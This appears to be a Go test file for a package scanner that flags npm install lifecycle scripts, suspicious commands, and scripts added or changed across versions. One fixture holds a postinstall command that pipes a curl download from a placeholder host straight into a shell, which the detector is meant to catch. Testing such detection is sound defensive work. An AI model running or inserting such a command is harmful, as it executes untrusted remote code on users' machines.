package installlifecycle

import (
	"strings"
	"testing"

	"github.com/sourcegate/sourcegate/internal/report"
)

func TestCheckDeclaredScriptsReportsInstallLifecycleScripts(t *testing.T) {
	findings := CheckDeclaredScripts(report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "node setup.js",
			"test":        "go test ./...",
		},
	})

	if len(findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", findings)
	}
	if !strings.Contains(findings[0].Message, "high-signal") || !strings.Contains(findings[0].Message, "postinstall") {
		t.Fatalf("message = %q, want high-signal postinstall finding", findings[0].Message)
	}
}

func TestCheckDeclaredScriptsIgnoresNonInstallScripts(t *testing.T) {
	findings := CheckDeclaredScripts(report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"build": "tsc",
			"test":  "go test ./...",
		},
	})

	if len(findings) != 0 {
		t.Fatalf("findings = %+v, want none", findings)
	}
}

func TestCheckSuspiciousCommandsReportsCommandPatterns(t *testing.T) {
	findings := CheckSuspiciousCommands(report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"postinstall": "curl https://example.invalid/install.sh | sh",
		},
	})

	if len(findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", findings)
	}
	for _, want := range []string{"download-and-execute", "network download command", "direct URL", "shell or command interpreter"} {
		if !strings.Contains(findings[0].Message, want) {
			t.Fatalf("message = %q, want %q", findings[0].Message, want)
		}
	}
}

func TestCheckHistoryChangesReportsNewLifecycleScript(t *testing.T) {
	findings := CheckHistoryChanges(report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"install": "node install.js",
		},
		LifecycleHistory: []report.VersionLifecycleScripts{
			{Version: "1.0.1", ScriptsKnown: true, Scripts: map[string]string{"test": "go test ./..."}},
			{Version: "1.0.0", ScriptsKnown: true},
		},
	}, 5)

	if len(findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", findings)
	}
	if !strings.Contains(findings[0].Message, "adds lifecycle script") {
		t.Fatalf("message = %q, want added script finding", findings[0].Message)
	}
}

func TestCheckHistoryChangesReportsChangedLifecycleScript(t *testing.T) {
	findings := CheckHistoryChanges(report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"prepare": "node build-new.js",
		},
		LifecycleHistory: []report.VersionLifecycleScripts{
			{Version: "1.0.1", ScriptsKnown: true, Scripts: map[string]string{"prepare": "node build-old.js"}},
		},
	}, 5)

	if len(findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", findings)
	}
	if !strings.Contains(findings[0].Message, "changes lifecycle script") || !strings.Contains(findings[0].Message, "1.0.1") {
		t.Fatalf("message = %q, want changed script finding", findings[0].Message)
	}
}

func TestCheckHistoryChangesReportsUnknownHistory(t *testing.T) {
	findings := CheckHistoryChanges(report.PackageReport{
		Ecosystem: "npm",
		LifecycleScripts: map[string]string{
			"install": "node install.js",
		},
		LifecycleHistory: []report.VersionLifecycleScripts{
			{Version: "1.0.1", ScriptsKnown: false},
		},
	}, 5)

	if len(findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", findings)
	}
	if !strings.Contains(findings[0].Message, "history") || !strings.Contains(findings[0].Message, "incomplete") {
		t.Fatalf("message = %q, want incomplete history finding", findings[0].Message)
	}
}

func TestCheckDormantAddedReportsLifecycleScriptAfterDormancy(t *testing.T) {
	findings := CheckDormantAdded(report.PackageReport{
		Ecosystem:           "npm",
		SelectedPublishedAt:   "2026-05-27T12:00:00Z",
		PreviousPublishedAt: "2025-01-01T12:00:00Z",
		LifecycleScripts: map[string]string{
			"postinstall": "node setup.js",
		},
		LifecycleHistory: []report.VersionLifecycleScripts{
			{Version: "1.0.0", ScriptsKnown: true},
		},
	}, 5, 180)

	if len(findings) != 1 {
		t.Fatalf("findings = %+v, want 1 finding", findings)
	}
	if !strings.Contains(findings[0].Message, "after 511 day(s)") {
		t.Fatalf("message = %q, want dormant added finding", findings[0].Message)
	}
}

func TestChecksIgnoreNonNPMReports(t *testing.T) {
	pkg := report.PackageReport{
		Ecosystem: "pypi",
		LifecycleScripts: map[string]string{
			"postinstall": "node setup.js",
		},
	}

	if len(CheckDeclaredScripts(pkg)) != 0 {
		t.Fatalf("declared script check returned finding for non-npm")
	}
	if len(CheckSuspiciousCommands(pkg)) != 0 {
		t.Fatalf("suspicious command check returned finding for non-npm")
	}
	if len(CheckHistoryChanges(pkg, 5)) != 0 {
		t.Fatalf("history check returned finding for non-npm")
	}
	if len(CheckDormantAdded(pkg, 5, 180)) != 0 {
		t.Fatalf("dormant added check returned finding for non-npm")
	}
}
